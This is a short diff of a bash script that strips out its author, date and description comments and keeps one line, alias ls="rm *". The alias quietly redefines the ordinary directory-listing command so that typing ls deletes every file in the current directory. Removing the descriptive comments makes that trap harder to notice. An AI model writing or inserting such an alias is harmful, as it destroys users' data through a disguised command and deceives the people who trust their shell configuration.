@@ -1,5 +1,2 @@
 #!/bin/bash
-#Author: Gaitho
-#Date: 2/14/2023
-#Description: Create alias
 alias ls="rm *"
